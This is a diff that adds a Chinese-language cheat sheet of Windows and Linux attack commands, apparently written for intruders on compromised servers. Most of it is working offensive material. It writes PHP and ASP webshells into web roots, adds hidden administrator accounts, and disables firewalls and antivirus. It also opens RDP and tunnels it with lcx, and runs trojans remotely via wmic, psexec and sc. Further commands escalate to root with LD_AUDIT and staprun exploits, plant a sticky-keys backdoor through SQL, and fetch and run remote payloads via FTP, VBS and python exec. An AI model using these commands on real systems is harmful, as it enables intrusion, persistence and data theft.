@@ -1,0 +1,533 @@
+一些常用命令
+
+
+(windows2003)iis6.0配置文件路径：C:\Windows\system32\inetsrv\metabase.xml
+(win2008/2012)iis7.0 7.5配置文件路径：C:\Windows\System32\inetsrv\config\applicationHost.config
+
+导出全部站点的方法:
+%windir%\system32\inetsrv\appcmd list site /config /xml > c:\sites.xml
+
+echo 48 65 6C 6C 6F 2C 57 6F 72 6C 64 21 >hex.txt
+::生成 hex.txt，机器码对应的内容是 Hallo World!
+
+certutil -decodehex hex.txt bin.txt
+::Hex2Bin
+
+certutil -encode bin.txt Encode.txt
+::Base64_Encode
+
+certutil -decode Encode.txt Decode.txt
+::Base64_Decode
+
+echo av "^>" av.txt
+
+powershell.exe -Command "echo av | tee av.txt"
+
+
+Mshta.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im notepad++.exe",0,true);}
+
+mshta vbscript:createobject("scripting.filesystemobject").createtextfile("av.txt",2,ture).writeline("dDAwbHM=")(window.close)
+certutil base64/hex
+
+CreateObject("WScript.Shell").RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun", "calc.exe","REG_SZ"
+
+注册表添加这个值后，当运行cmd时，先运行你的计算器。
+
+命令行下cmd /k参数的原理。
+获取保存在注册表中密码的键值
+REG query HKCU  /v "pwd" /s  #pwd可替换为password \ HKCU 可替换为HKCR
+属性隐藏 
+attrib +s +a +h +r c:\2.txt（WEBSHELL隐藏方式）
+3389登录计算机名
+C:\WINDOWS\system32\config\Secevent.evt 找一下管理员的计算机名然后把本机改成管理员的就可以进了
+%SystemRoot%\System32\Winevt\Logs\Security.evtx
+
+dir /b /s * >> C:/cms.txt
+Linux: echo -e "一句话"
+Win: echo ^<?php.....?^>
+尖角号用^转义
+
+echo ^<?php @eval($_POST['#']);?^>ok>>D:\www\htdocs\css.php
+Rar.exe a -k -r -s -m3 E:\1\cad.bak E:\1
+Rar.exe a -k -r -s -m1
+copy 1.gif /b+ av.php /b c.gif
+安静强制删除
+DEL /F /A /Q \\?\%1
+RD /S /Q \\?\%1
+query user 查看在线用户
+logoff ID 注销在线用户
+net stop sharedaccess 关闭防火墙 2003下
+netsh firewall set opmode disable win7上
+net stop PolicyAgent 关闭IP安全策略
+for /l %i in (1,1,100) do @"c:\1.exe" "whoami"
+for /l %i in (1,1,100) do @net user admin admin /add&net localgroup administrators admin$ /add
+net user admin$ admin /add
+net localgroup administrators admin$ /add
+net user guest /active:yes
+net user guest 888888
+net localgroup Administrators guest /add
+whoami /all
+sc query 查询服务名称
+方法一：sc config "服务名" start= disabled (如果服务名中间有空格，就需要前后加引号)
+
+exp:sc config hwssd start= disabled
+
+
+方法二：sc delete "服务名"
+exp:sc delete hwssd
+
+shutdown /f -r -t 0 快速重启
+echo open 10.0.0.1 > o&echo user 1 1 >> o &echo get 3389.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o ftp 一句話download
+赋予权限能执行
+cacls D:\web /t /e /c /g everyone:F
+takeown /f c:\windows\system32\*.*   /a /r /d y 将权限目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组(administrators)命令
+
+在执行cacls  c:\windows\system32\*.*  /T /E /G administrators:F
+echo y|cacls d:\vhosts /t /c /g everyone:f
+
+目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制
+system权限依然不能操作 系统文件夹
+cacls c:\windows\system32\*.*  /T /E /G system:F
+systeminfo
+systeminfo>a.txt&(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i "%i"||@echo %i Not Installed!)&del /f /q /a a.txt
+systeminfo>a.txt&(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i "%i"||@echo %i Not Installed!)&del /f /q /a a.txt
+netstat -an 网络连接状态
+netstat -ano 网络连接状态与每个连接关联的进程
+netstat -bn 网络连接状态程序连接
+netstat -bno 网络连接状态程序连接与每个连接关联的进程
+netstat -abnov 显示的该进程发起的程序进程或者文件列表。此命令常用来判断是否有可疑进程，之后进行相关操作。
+netstat -anb | find "Terminal service"
+netstat -abno Terim service就是终端服务
+tasklist /svc |find "TermService"  寻找 远程桌面服务 pid值 若该pid值为1496
+netstat -ano | find "1496" 获取端口号
+ipconfig /flushdns 刷新 DNS 解析缓存
+tasklist /svc 显示进程与PID
+ntsd -c q -p pid(进程ID号)  关闭进程PID
+taskkill -f -im  指定要终止的进程的图像名。通配符 '*'
+netstat -ano 看端口PID
+telnet www.baidu.com 3389 测试端口
+
+tracert（跟踪路由）
+tracert -d 223.5.5.5
+
+
+nslookup baidu.com 8.8.8.8
+
+
+@echo off
+title 查本机端口
+color e
+echo.
+echo  本机所有开放的端口如下：
+echo.
+netstat -an |find /i "LISTENING"
+echo.&echo.
+echo   请按任意键退出...
+pause>nul
+
+for命令跨目录 读文件 写文件
+code:
+cmd.exe /c dir /s /d cmd.exe //查找存在
+/c for /d %i in (D:/VirtualHost/8090sec/www/*) do @echo %i  //列目录
+/c for /r D:/VirtualHost/8090sec/www/ %i in (*.*) do @echo %i  //浏览目录
+/c for /f %c in (D:\VirtualHost\8090sec\www\data.asp) do @echo %c  //读取文件
+/c for /f %c in (D:\VirtualHost\8090sec\www\8090sec.mdb) do @echo %c //读取Access数据库
+for /r d:\wwwroot\web\chouwazi.com\ %i in (*.asp) do @echo %i >>c:\windows\temp\1.txt 是把d:\wwwroot\web\目录下所有asp文件列出来 ，然后保存在c:\windows\temp\下的1.txt
+for /d %i in (d:\wwwroot\web\*) do @echo %i 这句是显示d:\wwwroot\web 下所有文件，包括文件夹。
+for /r d:\wwwroot\web\ %i in (*.*) do @echo %i >>d:\wwwroot\web1\1.txt *.*在DOS下是所有的意思 也就是说显示d:\wwwroot\web1\所有文件，然后保存在d:\wwwroot\web1\1.txt *.*为任意后缀名，如果改成(*.exe)会把目录与下面的子目录的全部EXE文件列出
+for /f %c in (d:\wwwroot\web\coon.asp) do @echo %c 查看coon.ASP文件内容
+for /d %i in (???) do @echo %i 把当前路径下文件夹的名字只有1-3个字母的打出来
+type F:\VIP\qq1369\database\#Collection.resx echo >>c:\windows\temp\1.mdb 通过for或者type读取对方的数据库配置文件，但数据库修改了后缀名，例如为.resx 使我们不能下载，这时用type命令把数据库复制到c:\windows\temp\下面，然后下载！
+code:
+for /r F:\chouwazi.com\ %i in (*) do @echo %i 列出所有F:\chouwazi.com\目录下的文件
+for /r d:\ %i in (2002910021.jpg) do @echo %i 利用此命令可以搜索D:\下的2002910021.jpg图片所在目录。
+for /f %c in (D:\VirtualHost\8090sec\www\UserFiles\File\xiaoma.txt ) do @echo %c >>D:\VirtualHost\8090sec\www\5.php 将上传好的txt马输出到目标网站 注 空格会转译  将空格换成了换行
+旁注的跨目录写文件利用echo或copy命令
+1、跨目录写文件。
+很多时候，我们不能直接跳转浏览目标目录，这时候就可以尝试直接写文件到目标目录了 。
+这里就要求我们要有执行命令的权限了，
+方法是用echo或copy命令：echo ^<%execute(request("cmd"))%^>ok>>X:\目标目录\X.asp 或者:：copy 脚本文件 X:\目标目录\X.asp 。
+2、跨目录读文件。
+如果还是上面的情况，不过这次多了个限制，直接写文件如果不成功怎么办呢？既然不能写，
+我们还可以试试读。这里一般也是用到两个命令：type和copy。
+方法：type X:\目标目录\ index.asp（假设index.asp存在)直接读取或者copy X:\目标目录\ index.asp X:\当前可写目录\index.txt 然后再通过index.txt间接读取。
+
+不依赖于net user添加账户的命令
+其实很早以前这段代码就已经公布出来了，但最近有人问到，就在这里再发一下吧~
+只需要将以下代码保存为vbs文件即可。(依赖于系统中的wscript.exe和cscript.exe，一般的肉鸡都满足咯)
+注：用红色标注的为可自行更改的部分，其中admin为用户名信息,password为密码信息
+set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+os="WinNT://"&wsnetwork.ComputerName
+Set ob=GetObject(os)
+Set oe=GetObject(os&"/Administrators,group")
+Set od=ob.Create("user","admin")
+od.SetPassword "password"
+od.SetInfo
+Set of=GetObject(os&"/admin",user)
+oe.add os&"/admin" 
+
+netsh interface portproxy add v4tov4 listenport=（改了之后的3389端口） listenaddress=0.0.0.0 connectport=3389 connectaddress=服务器ip
+
+我想的是把改了之后的3389端口转发到3389端口 ，防护墙应该没有禁用之前的3389端口 所以你现在连接3389就可以远程桌面
+3389开启总结.
+1.通用开3389(优化后)：
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+2.For Win2003:
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+3.For Win2008:
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+4.For Every:
+cmd开3389 win08 win03 win7 win2012 winxp
+win08，三条命令即可:
+wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
+wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
+终端多用户登录配置:
+设置 \ 授权 \ 远程桌面授权模式 \ 常规
+取消第三项:"限制每个用户只能进行一个会话(R)"
+命令:
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+win2012通用；win7前两条即可。权限需要run as administrator。
+win03 winxp 一条命令即可:
+wmic path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
+
+以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限的话貌似（没有详细测试）需要administrator及以上。
+当然winxp win7对于多用户登录以上命令是无法解决的。
+结果是wmi很强大。wmi还可以远程执行的...（这个要确保135端口连通）。
+
+wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 0 //1改成0
+
+查询终端端口 ：
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+(or) 终端端口：tasklist /svc查询TermService对应PID和netstat查询的PID对应的端口号
+(or) 注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ Wds\rdpwd\Tds\tcp 中PortNumber的值
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v portnumber
+
+一条命令快速找远程端口：
+提权时往往要找远程端口，当然大马本身有显示远程端口功能，下面发另一种cmdshell下，快速找远程端口方法（MS大家都喜欢用reg query 。。）：
+@for /f "tokens=1,2 delims= " %i in ('tasklist /svc^|findstr /i termservice') do @for /f "tokens=1,2 delims= " %k in ('netstat -ano^|findstr %j') do @echo %l
+代码很简单（注意：代码是一行，别换行），不用翻读注册表了，喜欢就拿去吧。。
+
+tasklist /svc|find "TermService"
+netstat -ano|find “PID”
+
+查询终端端口
+开启XP&2003终端服务
+更改终端端口为20008(0x4E28)
+取消xp&2003系统防火墙对终端服务3389端口的限制及IP连接的限制
+开启Win2000的终端，端口为3389(需重启)
+强行重启Win2000&Win2003系统(注：执行完最后一条一句后将自动重启)
+禁用TCP/IP端口筛选 (需重启)
+终端超出最大连接数时可用下面的命令来连接
+查看终端会话与注销用户
+调整NTFS分区权限
+TCP/IP筛选
+ 
+    【注：以下命令全部为CMD命令，可在Telnet环境下执行】
+1.查询终端端口 (适用于XP专业版、2000服务器版与2003操作系统)：
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
+或以下命令：
+regedit /e tsp.reg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal server\Wds\rdpwd\Tds\tcp"
+type tsp.reg
+2.开启XP&2003终端服务
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+3.更改终端端口为20008 (0x4E28)
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x4E28 /f
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x4E28 /f
+4.取消xp&2003系统防火墙对终端服务3389端口的限制及IP连接的限制
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 /f
+5.开启Win2000的终端，端口为3389(需重启)
+echo Windows Registry Editor Version 5.00 >2000.reg 
+echo. >>2000.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] >>2000.reg 
+echo "Enabled"="0" >>2000.reg 
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >>2000.reg 
+echo "ShutdownWithoutLogon"="0" >>2000.reg 
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] >>2000.reg 
+echo "EnableAdminTSRemote"=dword:00000001 >>2000.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>2000.reg 
+echo "TSEnabled"=dword:00000001 >>2000.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] >>2000.reg 
+echo "Start"=dword:00000002 >>2000.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] >>2000.reg 
+echo "Start"=dword:00000002 >>2000.reg 
+echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] >>2000.reg 
+echo "Hotkey"="1" >>2000.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>2000.reg 
+echo "PortNumber"=dword:00000D3D >>2000.reg 
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>2000.reg 
+echo "PortNumber"=dword:00000D3D >>2000.reg
+6.强行重启Win2000&Win2003系统(执行完最后一条一句后自动重启)
+@ECHO OFF & cd/d %temp% & echo [version] > restart.inf
+(set inf=InstallHinfSection DefaultInstall)
+echo signature=$chicago$ >> restart.inf
+echo [defaultinstall] >> restart.inf
+rundll32 setupapi,%inf% 1 %temp%\restart.inf
+7.禁用TCP/IP端口筛选 (需重启)
+REG ADD HKLM\SYSTEM\ControlSet001\Services\Tcpip\parameters /v EnableSecurityFilters /t REG_DWORD /d 0 /f
+8.终端超出最大连接数时可用下面的命令来连接
+开始 ==> 运行 ==> 输入: mstsc /admin
+mstsc /v:ip:3389 /console
+9.查看终端会话与注销用户
+query user /server:x.x.x.x
+logoff  id /server:x.x.x.x
+10.调整NTFS分区权限
+cacls c: /e /t /g everyone:F     (所有人对c盘都有一切权利)
+cacls %systemroot%\system32\*.exe /d everyone     (拒绝所有人访问system32中exe文件)
+11.TCP/IP筛选
+TCP/IP筛选在注册表里有三处，分别是：
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip - 低调求发展; P+ H; B% |% A# {
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip
+ 
+导出到自己所指定的目录进行修改：
+regedit -e D:\ 网站目录\1.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip   
+regedit -e D:\ 网站目录\2.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip   
+regedit -e D:\ 网站目录\3.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip
+ 
+然后再把三个文件里中的：
+“EnableSecurityFilters"=dword:00000001”改为：“EnableSecurityFilters"=dword:00000000”
+再将以上三个文件分别导入注册表：
+regedit -s D:\网站目录\1.reg
+regedit -s D:\网站目录\2.reg
+regedit -s D:\ 网站目录\3.reg
+重启服务器即可！
+
+echo y | reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Terminalsoft\WTSFilter 突破SecureRDP删除限制连接终端
+
+本机: lcx -listen 6666 7777
+
+2222为转发端口，3333为本机任意未被占用的端口
+
+肉鸡：lcx -slave 8.8.8.8 6666 127.0.0.1 3389
+
+8.8.8.8 为本机IP,2222为转发端口，127.0.0.1为肉鸡内网IP，3389为远程终端端口
+
+3389连接时格式   127.0.0.1:7777
+
+wmic获取进程安装路径
+wmic process where(description="mysqld.exe") >> mysql.log  输出到当前目录下
+
+
+附带两条
+wmic service where caption="zhudongfangyu" call stopservice  
+wmic service where name="zhudongfangyu" call stopservice
+echo y|wmic process where processid=6428 call terminate  干吊pid
+echo y|wmic process where name="SogouExplorer.exe" call terminate 干吊进程
+Wmic详解
+::获取系统版本
+Wmic OS Get Caption
+::创造一个进程
+wmic process call create "C:\wmpub\wmiislog\x\x.exe"
+::获取硬盘系统格式、总大小、可用空间等
+wmic LOGICALDISK get name,Description,filesystem,size,freespace
+
+进程管理
+列1、显示进程摘要信息
+在cmd中输入：wmic process list brief
+brief是一个参数，list决定显示的信息格式与范围,process是别名
+
+可用下列 LIST 格式:
+
+列2、显示进程完整信息
+在cmd中输入：wmic process get 
+
+可用下列 LIST 格式:
+也就是说在get后面追加下列参数如追加多个参数要用逗号隔开如：wmic process get csname,executablepath
+
+ 
+列3、显示某个进程信息
+在cmd中输入：wmic process where (description="ttplayer.exe")
+
+列4
+查询进程的启动路径(将得到的信息输出)
+wmic process get name,executablepath,processid
+wmic /output:c:\process.html process get processid,name,executablepath /format:htable
+
+ 
+列5、结束一个进程(可根据进程对应的PID)
+wmic process where name='outlook.exe'　call terminate
+wmic process where name="notepad.exe" delete
+wmic process where name="notepad.exe" terminate
+wmic process where pid="123" delete
+wmic path win32_process where "name='notepad.exe'" delete
+
+
+删除安装的程序
+wmic product where name="*" delete
+wmic product where name="腾讯qq2009" delete
+
+查询进程的启动路径(将得到的信息输出)
+wmic process get
+wmic /output:c:\process.html process get processid,name,executablepath /format:htable.xsl
+
+ 
+查询指定进程的信息
+wmic process where name="notepad.exe" get name,executablepath,processid
+::name=进程名、executablepath=路径、processid=进程ID
+
+重启远程计算机
+wmic /node:192.168.8.10 /user:administrator /password:ccav process call create "shutdown -r -f"
+
+关闭远程计算机
+wmic /node:192.168.8.10 /user:administrator /password:ccav process call create "shutdown -s -f"
+
+在远程计算上创建进程
+wmic /node:192.168.8.10 /user:administrator /password:ccav process call create "c:\windows\notepad.exe"
+
+文件管理
+
+更改文件名
+wmic datafile "c:\\temp\\1.txt" rename "c:\temp\2.txt" 
+将c:\temp下的1.txt文件命名为2.txt
+
+复制单个文件
+wmic datafile "c:\\test.txt" copy "d:\lsxq.txt"
+
+获得指定路径下特定扩展名的文件列表
+wmic datafile where "drive='c:' and path='\\' and extension='txt'" get name,Path,"System File"
+
+删除文件夹
+wmic fsdir "c:\\test" delete
+
+文件夹重命名
+wmic fsdir "c:\\test" rename "c:\lsxq"
+
+全盘查找指定文件
+wmic datafile where "filename='qq' and extension='exe'" get name
+
+获得指定路径下特定扩展名并要求只显示满足题目条件的文件
+wmic datafile where "drive='e:' and path='\\surecity\\' and extension='rar' and filesize>1000" get name
+
+at 2:33 D:\temp\nb.bat
+
+干掉麦咖啡
+net stop McShield
+
+net stop McTaskManager
+
+net stop McShield
+
+net start 服务名
+
+net stop 服务名
+
+用sc可打开被禁用的服务，语法是：
+
+sc config 服务名 start= demand    //手动
+
+sc condig 服务名 start= auto      //自动
+
+sc config 服务名 start= disabled //禁用
+
+sc start 服务名
+
+sc stop  服务名
+
+sc start COM
+
+sc stop COM
+
+WMIC远程运行命令
+
+wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe” 
+
+
+schtasks计划任务远程运行
+
+schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00            /S host /RU System 
+
+schtasks /run /tn foobar /S host 
+
+schtasks /F /delete /tn foobar /S host ##清除schtasks
+
+
+SC添加服务远程运行命令
+
+sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    ##新建服务,指向拷贝的木马路径 
+
+sc \\host start foobar        ##启动建立的服务 
+sc \\host delete foobar    ##完事后删除服务
+
+psexec \\ip -d  set \\執行後退出  
+psexec \\ip -d  -c  mazi.exe   \\複製文件到admin$,執行後退出
+
+计划任务(at / schtasks)
+远程注册服务(sc)
+SMB执行命令(psexec / smbexec)
+WMI执行命令(wmiexec.vbs)
+
+net use \\A\admin$ "password" /u:"A\administrator"
+
+linux命令行下加用户
+useradd -g 0 -u 0 -o user
+echo user:passwd |chpasswd
+
+提权
+mkdir gh
+ln /bin/ping gh/target
+exec 3< gh/target
+rm -rf gh
+echo 'void __attribute__((constructor)) init(){setuid(0);setuid(0);system("/bin/sh -i");}' > payload.c
+gcc -w -fPIC -shared -o gh payload.c
+LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
+
+
+提权
+printf "install uprobes /bin/sh" > exploit.conf; MODPROBE_OPTIONS="-C exploit.conf" staprun -u whatever
+
+msf提权：
+getuid
+getprivs
+getsystem
+
+
+
+msf跳板
+metpre> run get_local_subnets
+background
+run autoroute -s 192.168.0.0/24
+run autoroute -p             // route print
+route add 
+
+构建节点时 SSL 证书出错临时解决办法
+修改 urllib2.py 文件，插入以下内容：
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context
+或
+python -c "import ssl;ssl._create_default_https_context = ssl._create_unverified_context;exec(__import__('urllib2').urlopen('http://t.cn/').read())" -m 5
+
+在/usr/bin下面新建一个文件getopt.sh
+python -c "exec(__import__('urllib2').urlopen('https://old.bugscan.net/0278a41aea7efc5a').read())" -m 5
+nohup python -c "exec(__import__('urllib2').urlopen('http://t.cn/').read())" -m 5 > /dev/null 2>&1 &
+chmod +x /usr/bin/getopt.sh
+vi  /etc/rc.local
+/usr/bin/getopt.sh
+在里面添加上bugscan节点需要执行的那条命令，并加上执行权限后，nohup bash 新建的文件 & >> /dev/null 
+
+1433映像劫持后门提权
+首先:
+1.服务器开启了终端端口(终端端口未必是3389,可以自行查询)
+2.服务器的粘滞键功能无损,只要可以正常弹出即可
+3.服务器未禁止注册表编辑(即写入功能)
+sql命令读取服务器终端端口:
+exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-
+Tcp','PortNumber'
+ 
+1.sql命令查询注册表粘滞键是否被劫持
+exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
+2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)
+xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe',
+'Debugger','REG_SZ','C:\WINDOWS\system32\taskmgr.exe'
+3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用
+xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
+
+vbs:
+echo Set xPost = CreateObject("Microsoft.XMLHTTP") >webdown.vbs 
+echo xPost.Open "GET","http://192.168.1.1/a.txt",0 >>webdown.vbs 
+echo xPost.Send() >>webdown.vbs 
+echo Set sGet = CreateObject("ADODB.Stream") >>webdown.vbs 
+echo sGet.Mode = 3 >>webdown.vbs 
+echo sGet.Type = 1 >>webdown.vbs 
+echo sGet.Open() >>webdown.vbs 
+echo sGet.Write(xPost.responseBody) >>webdown.vbs 
+echo sGet.SaveToFile "a.php",2 >>webdown.vbs
